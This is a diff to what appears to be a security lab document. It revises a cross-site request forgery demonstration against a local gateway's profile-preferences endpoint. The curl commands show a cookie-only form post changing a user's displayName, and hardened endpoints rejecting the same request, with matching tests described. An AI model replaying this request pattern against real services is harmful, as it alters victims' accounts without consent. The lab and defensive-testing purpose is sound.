@@ -118,36 +118,37 @@ counterparts here do exactly that.
 
 ### COOKIE-003 — exploit lab
 
-The form a page on another origin submits, sent as curl (the answer is the
+The form a page on another origin submits, sent as curl — `displayName` is a
+field the profile accepts, so the change is written (the answer is the
 stand-in's echo of what reached the service; in the whole lab it is what
 `accounts` answers to the same carried request):
 
 ```console
 $ curl -s -i -X POST -H "cookie: vcx_session=$A" -H 'content-type: application/x-www-form-urlencoded' \
-    --data 'theme=dark&language=fr' http://127.0.0.1:4400/api/v1/profile/preferences
+    --data 'displayName=Cross-site+change' http://127.0.0.1:4400/api/v1/profile/preferences
 HTTP/1.1 200 OK
 …
-{"echoed":true,"service":"accounts","reached":{"method":"PUT","path":"/internal/profile","protocol":"2.0","headers":{…,"cookie":"vcx_session=eyJ…",…},"body":{"theme":"dark","language":"fr"}}}
+{"echoed":true,"service":"accounts","reached":{"method":"PUT","path":"/internal/profile","protocol":"2.0","headers":{…,"cookie":"vcx_session=eyJ…",…},"body":{"displayName":"Cross-site change"}}}
 ```
 
-The observation that proves exploitation: the preference crossed to the
-profile — `PUT /internal/profile`, the form's `theme=dark` in the body, the
-session cookie as the caller — driven by nothing a page on another site
-cannot send. The same form through the counterparts:
+The observation that proves exploitation: the change crossed to the profile —
+`PUT /internal/profile`, the form's `displayName` in the body, the session
+cookie as the caller — driven by nothing a page on another site cannot send.
+The same form through the counterparts:
 
 ```console
 $ curl -s -o /dev/null -w '%{http_code}\n' -X POST -H "cookie: vcx_session=$A" \
-    -H 'content-type: application/x-www-form-urlencoded' --data 'theme=dark' \
+    -H 'content-type: application/x-www-form-urlencoded' --data 'displayName=Cross-site+change' \
     http://127.0.0.1:4400/api/v1/profile/preferences/json
 401
 
 $ curl -s -o /dev/null -w '%{http_code}\n' -X POST -H "authorization: Bearer $A" \
-    -H 'content-type: application/x-www-form-urlencoded' --data 'theme=dark' \
+    -H 'content-type: application/x-www-form-urlencoded' --data 'displayName=Cross-site+change' \
     http://127.0.0.1:4400/api/v1/profile/preferences/json
 415
 
 $ curl -s -i -X POST -H "cookie: vcx_session=$A" -H 'content-type: application/x-www-form-urlencoded' \
-    --data 'theme=dark' http://127.0.0.1:4400/api/v1/profile/preferences/csrf
+    --data 'displayName=Cross-site+change' http://127.0.0.1:4400/api/v1/profile/preferences/csrf
 HTTP/1.1 403 Forbidden
 …
 Missing csrf secret
@@ -176,7 +177,8 @@ cross-site form, with nothing but the cookie, does not pass them.
 
 `apps/gateway/test/scenarios/edge.int-spec.ts`: one test posts the form with
 the session cookie and asserts `PUT /internal/profile` was reached with the
-form's `theme` and the cookie — what was gained; one test posts the same form
-to `preferences/json` with no bearer header (401) and with a bearer header
-but the form body (415); one test posts it to `preferences/csrf` and asserts
-the 403 and that nothing more reached the service — why each was refused.
+form's `displayName` and the cookie — what was gained; one test posts the
+same form to `preferences/json` with no bearer header (401) and with a bearer
+header but the form body (415); one test posts it to `preferences/csrf` and
+asserts the 403 and that nothing more reached the service — why each was
+refused.
